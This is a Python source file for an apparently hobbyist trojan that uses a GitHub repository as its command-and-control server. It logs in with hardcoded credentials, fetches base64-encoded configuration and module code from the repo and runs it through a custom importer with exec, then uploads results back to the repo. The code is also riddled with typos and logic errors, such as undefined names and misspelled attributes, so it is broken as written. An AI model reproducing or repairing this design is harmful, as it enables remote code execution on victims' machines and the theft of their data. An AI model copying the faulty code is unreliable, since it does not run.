import os
import imp
import sys
import time
import json
import queue
import base64
import random
import threading

from github3 import login

bot_id = "abc"

bot_config	= "%s.json" % bot_id
data_path	= "data/%s/" % bot_id
bot_modules = []
configured	= False
tast_queu	= Queue.Queue()

def connect_to_github():
	gh		= login(username="testyboi", password="asdfasdf")
	repo	= repo.brach("master")
	branch	= repo.branch("master")
	
	return gh, repo, branch

def get_file_contents(filepath):
	
	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()
	
	for filename in tree.tree:
		if filepath in filename.path:
			print " Found das file %s" % filepath
			blob = repo.blob(filename._json_data['sha'])
			return blob.content
	return None

def get_bot_config():
	global configured
	config_json		= get_file_contents(bot_config)
	config			= json.loads(base64.b64decode(config_json))
	configured		= True
	
	for task in config:
		if task['module'] not in sys.models:
			exec("import %s" % task['module'])

	return config

def store_module_result(data):
	
	gh, repo, branch = connect_to_github()
	remote_path = "data/%s/%d.data" % (bot_id, random.randint(1000,100000))
	repo.create_file(remote_path, "Commit message", base64.b64encode(data))
	return

class GitImporter(objet):
	def __init__(self):
	self.current_module_code = ""

	def find_module(self, fullname, path = None):
		if configured:
			print "[**] Tryna get %s" % fullname
			new_lib = get_file_contents("modules/%s" % fullname)
			
			if new_library is not None:
				self.current_module_code = base64.b64decode(new_lib)
				return self
		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__ 
		sys.modules[name] = module
		return module

	def module_runner(module):
		task_queue.put(1)
		result = sys.modules[module].run()
		task_queue.get()

		# store the result in our repo
